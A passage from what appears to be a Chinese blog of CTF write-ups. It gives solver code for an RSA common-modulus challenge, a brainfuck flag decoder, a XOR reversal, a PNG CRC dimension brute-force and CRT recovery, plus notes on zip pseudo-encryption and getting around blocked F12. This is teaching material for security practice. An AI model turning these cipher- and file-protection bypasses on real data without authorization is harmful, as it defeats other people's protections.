33002001040793361121205743705051566694083960204437803400110996553874970546459769940895274538944142911035661180721041433582055055901827086366079458238180515982882281159369335115689197909674012289803866694817803339799332165760217770985620911446230237865457225365735286754884597360255964535103536362788889343153</span></span><br><span class="line"><span class="string">c2 = 28612632923221914052449458260170537094022260373135401108346955487860713981145320349945832078855063911329616383875004373295934310132767249858424266864981319085969453037587482565982836138763906635775429377847559657878241052164215585546465219419202751784070881845017799754069244601020027997406547478196338470880</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>解法：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#from Crypto.Util.number import *</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">97600241525101615748091592571664660926639880623676630098513390980179339048294452878617774530804846547759693682625720452045482941031433063601264167464483345140203593650062234011147495096867025786848883396312986373098722431552517575960894385653813275110519118159478403718867113163144951756435064109978693850991</span></span><br><span class="line">e1 = <span class="number">3739335288</span></span><br><span class="line">e2 = <span class="number">3124897683</span></span><br><span class="line">c1 = <span class="number">33002001040793361121205743705051566694083960204437803400110996553874970546459769940895274538944142911035661180721041433582055055901827086366079458238180515982882281159369335115689197909674012289803866694817803339799332165760217770985620911446230237865457225365735286754884597360255964535103536362788889343153</span></span><br><span class="line">c2 = <span class="number">28612632923221914052449458260170537094022260373135401108346955487860713981145320349945832078855063911329616383875004373295934310132767249858424266864981319085969453037587482565982836138763906635775429377847559657878241052164215585546465219419202751784070881845017799754069244601020027997406547478196338470880</span></span><br><span class="line"></span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;s = &#x27;</span>,s)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n)*<span class="built_in">pow</span>(c2, s2, n) % n  <span class="comment"># 最后别忘记再模上一个n，整体都在模n中</span></span><br><span class="line"><span class="comment">#flag = long_to_bytes(m).decode()</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(iroot(m, <span class="number">3</span>)[<span class="number">0</span>]))</span><br><span class="line"><span class="comment">#print(flag) </span></span><br></pre></td></tr></table></figure><ul><li><a href="https://saga131.github.io/2024/09/17/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/">参考</a>；<a href="https://www.cnblogs.com/SevensNight/p/18766177">未看</a></li></ul><h3 id="签个到吧！"><a href="#签个到吧！" class="headerlink" title="签个到吧！"></a>签个到吧！</h3><ul><li>题目：</li></ul><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line">&gt;<span class="literal">+++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++</span><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+++++++++++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br></pre></td></tr></table></figure><ul><li>试图解释：<ul><li>快速笔记：“.”为指针位置</li><li>&gt;+++++++++++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]<ul><li>&gt;+17 ; [&lt;+6&gt;-1] ; ; &gt;+12 ; [&lt;+9&gt;-] ;</li><li>0 17. ; 17<em>6 &#x3D; 102 0. ; 0. 0 ; 0 12. ; 9</em>12 &#x3D; 108 0. ;</li><li>102 0. → 108 0.</li></ul></li><li>&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]<ul><li>&lt; ; &gt;+97 ; [&lt;+&gt;-]</li><li>108. 0 ; 108 97. ; 108 + 97 &#x3D; 205 0.</li></ul></li></ul></li><li>大概理解了，开造</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">brainfuck</span>(<span class="params">a</span>):</span><br><span class="line">    li = [<span class="number">0</span>]</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    kuo = []</span><br><span class="line">    output = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(a):</span><br><span class="line">        <span class="keyword">if</span> a[i] == <span class="string">&#x27;+&#x27;</span> <span class="keyword">or</span> a[i] == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            li[index] = <span class="built_in">eval</span>(<span class="built_in">str</span>(li[index]) + a[i] + <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(li) &lt;= index:</span><br><span class="line">                li.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">            index -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(li[index], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            output.append(li[index])</span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            li[index] = <span class="built_in">ord</span>(a[i])</span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> li[index] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">while</span> a[i] != <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                kuo.append(i)</span><br><span class="line">        <span class="keyword">elif</span> a[i] == <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> li[index] != <span class="number">0</span>:</span><br><span class="line">                i = kuo.pop()-<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                temp = kuo.pop()</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&gt;+++++++++++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = a.replace(<span class="string">&#x27;[-]&#x27;</span>, <span class="string">&#x27;.[-]&#x27;</span>)</span><br><span class="line">output = brainfuck(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> output:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>解释：就是指针内容没有用.输出，所以在[-]删除前加输出从而得到结果</li><li>教训：人要好好学习不要偷懒用AI哈哈哈讲的差不多理解就是完全没理解</li></ul><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p><img src="/images/4-1.png"></p><ul><li>循环28次（i从0到27）说明flag长度为28个字符</li><li>验证条件<ul><li>v4[i]：用户输入的第i个字符</li><li>(unsigned __int8)：将字符转换为无符号8位整数（0-255）</li><li>^ 0x7A：与十六进制0x7A（十进制122）进行异或运算</li><li>enc_0[i]：预设的正确加密值的第i个元素</li><li>!&#x3D;：比较是否不相等</li></ul></li></ul><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p><img src="/images/4-2.png"></p><ul><li>db：Define Byte 表示定义字节数据</li><li>有 h 后缀：明确表示十六进制</li><li>n dup (a)：表示n个a</li></ul><h4 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc_0 = [</span><br><span class="line">    <span class="number">0x34</span>, <span class="number">0x29</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x2E</span>, <span class="number">0x3C</span>, <span class="number">0x01</span>, <span class="number">0x22</span>, <span class="number">0x15</span>, <span class="number">0x08</span>, <span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x09</span>, <span class="number">0x25</span>, <span class="number">0x18</span>, <span class="number">0x1B</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x19</span>, <span class="number">0x25</span>, <span class="number">0x08</span>, <span class="number">0x1F</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x1F</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x1F</span>, <span class="number">0x07</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">enc_data</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> encrypted <span class="keyword">in</span> enc_data:</span><br><span class="line">        <span class="comment"># 异或解密：encrypted ^ 0x7A</span></span><br><span class="line">        original_char = encrypted ^ <span class="number">0x7A</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(original_char)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">flag = decrypt_flag(enc_0)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure><h3 id="这羽毛球怎么只有一半啊（恼）"><a href="#这羽毛球怎么只有一半啊（恼）" class="headerlink" title="这羽毛球怎么只有一半啊（恼）"></a>这羽毛球怎么只有一半啊（恼）</h3><ul><li>crc高度题 010editor打开下方有报错信息，记得拉上来看！</li><li>代码</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;./羽毛球.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    <span class="comment">#打开图片</span></span><br><span class="line">crc32frombp = <span class="built_in">int</span>(crcbp[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)     <span class="comment">#读取图片中的CRC校验值</span></span><br><span class="line"><span class="built_in">print</span>(crc32frombp)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                        <span class="comment">#宽度1-4000进行枚举</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):                    <span class="comment">#高度1-4000进行枚举</span></span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment">#print(crc32)</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32frombp):            <span class="comment">#计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span></span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h4 id="【待】"><a href="#【待】" class="headerlink" title="【待】"></a>【待】</h4><ul><li>修改高度（额看了wp改的怎么找）bushi没法理解为什么修改这里<br><img src="/images/4-3.png"></li></ul><h3 id="掩码爆破"><a href="#掩码爆破" class="headerlink" title="掩码爆破"></a>掩码爆破</h3><ul><li>如题，简单</li></ul><h3 id="F12"><a href="#F12" class="headerlink" title="F12?"></a>F12?</h3><ul><li>当个别网页禁用F12，无法查看网页源代码时，可以通过地址栏操作后使用F12：</li><li>打开目标网页后，不要直接按F12，而是先用鼠标点击浏览器地址栏，全选当前网址。在全选网址的状态下，按下F12键。此时，部分网页可能会因为这一操作而解除对F12的禁用，从而允许你打开开发者工具查看源代码。</li></ul><h3 id="F12-1"><a href="#F12-1" class="headerlink" title="F12"></a>F12</h3><ul><li>极其简单，如题</li></ul><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><ul><li>极其简单，如题</li></ul><h3 id="word-03"><a href="#word-03" class="headerlink" title="word-03"></a>word-03</h3><ul><li>伪加密<a href="https://blog.csdn.net/xiaozhaidada/article/details/124538768">参考</a><ul><li>特征：<ul><li>压缩源文件数据区的全局方式位标记应当为 00 00  （50 4B 03 04 14 00 后）</li><li>且压缩源文件目录区的全局方式位标记应当为 09 00   （50 4B 01 02 14 00 后）</li></ul></li><li>修改方法：<ul><li>确定是伪加密后就需要将其修改为无加密，方法很简单，就是将压缩源文件目录区的全局方式位标记从09 00改为00 00。</li></ul></li></ul></li><li>将这个word文件重命名为zip后，发现还能继续解压</li><li>找到flag</li><li>反思：搜索时注意是搜索文本还是十六进制，好愚蠢的问题已经第二次犯了|-_-··|</li></ul><h3 id="Basic-Number-theory"><a href="#Basic-Number-theory" class="headerlink" title="Basic Number theory"></a>Basic Number theory</h3><ul><li>同余基本性质<ul><li>‌反身性‌：a ≡ a (mod m)，任何整数与其自身同余。</li><li>‌对称性‌：若a ≡ b (mod m)，则b ≡ a (mod m)，同余关系可逆。‌</li><li>‌传递性‌：若a ≡ b (mod m)且b ≡ c (mod m)，则a ≡ c (mod m)，允许链式推导。</li><li>‌运算性质‌：<ul><li>加减性：若a ≡ b (mod m)且c ≡ d (mod m)，则a±c ≡ b±d (mod m)。‌</li><li>乘性：若a ≡ b (mod m)且c ≡ d (mod m)，则ac ≡ bd (mod m)，推广至幂次有aⁿ ≡ bⁿ (mod m)。‌</li><li>消去律‌：若ca ≡ cb (mod m)且(c,m)&#x3D;1（c与m互质），则a ≡ b (mod m)。‌‌</li></ul></li></ul></li><li>解决代码+详细计算过程</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">105567001902149483225233801278030547652749833525571608392930512645364400245999</span></span><br><span class="line">q = <span class="number">81511997683966846473333390828680375856568631631277717336250575831122994340471</span></span><br><span class="line">gift1 = <span class="number">105419799642658114984760815640014033297217363704585842609128111376906603236722</span></span><br><span class="line">gift2 = <span class="number">81364795424475478232860405190663861501036161810291951552448174562665197331194</span></span><br><span class="line"><span class="comment">#根据模运算的基本性质：如果 a ≡ b (mod n)，那么 a² ≡ b² (mod n)</span></span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(gift1 == <span class="built_in">pow</span>(gift1,<span class="number">1</span>,p))</span><br><span class="line"><span class="comment"># &gt;&gt;&gt; True</span></span><br><span class="line"><span class="comment"># 所以gift1² ≡ m^(q+1) (mod q)</span></span><br><span class="line"><span class="comment"># 继续用费马小定理：</span></span><br><span class="line"><span class="comment"># gift1² ≡ m^(q+1) (mod q)</span></span><br><span class="line"><span class="comment">#        ≡ m^q × m (mod q)</span></span><br><span class="line"><span class="comment"># 根据费马小定理：m^q ≡ m (mod q)（当 q 是素数时）</span></span><br><span class="line"><span class="comment"># gift1² ≡ m × m (mod q) ≡ m² (mod q)</span></span><br><span class="line"><span class="comment"># 实际上我们有：gift1^2 ≡ m^2 mod q ; gift2^2 ≡ m^2 mod p</span></span><br><span class="line"><span class="comment"># 这意味着：gift1^2 - m^2 ≡ 0 mod q  =&gt; q | (gift1^2 - m^2)</span></span><br><span class="line"><span class="comment">#          gift2^2 - m^2 ≡ 0 mod p  =&gt; p | (gift2^2 - m^2)</span></span><br><span class="line"><span class="comment"># 所以(gift1 - m)(gift1 + m) ≡ 0 mod q</span></span><br><span class="line"><span class="comment">#     (gift2 - m)(gift2 + m) ≡ 0 mod p</span></span><br><span class="line"><span class="comment"># 关键数学原理：在模素数的情况下，如果 a × b ≡ 0 mod p（其中 p 是素数），那么：</span></span><br><span class="line"><span class="comment"># 要么 a ≡ 0 mod p</span></span><br><span class="line"><span class="comment"># 要么 b ≡ 0 mod p</span></span><br><span class="line"><span class="comment"># 这是因为素数的一个重要性质：模素数的环是整环，没有零因子。</span></span><br><span class="line"><span class="comment"># 因此 m ≡ ±gift1 mod q ; m ≡ ±gift2 mod p</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="built_in">print</span>(math.gcd(p,q))</span><br><span class="line"><span class="comment"># &gt;&gt;&gt; 1</span></span><br><span class="line"><span class="comment"># https://oi-wiki.org/math/number-theory/crt/#%E8%BF%87%E7%A8%8B</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"></span><br><span class="line">a = [-gift1,-gift2]</span><br><span class="line">r = [p,q]</span><br><span class="line"></span><br><span class="line">m = crt(r, a)[<span class="number">0</span>]</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h3 id="basic-RSA"><a href="#basic-RSA" class="headerlink" 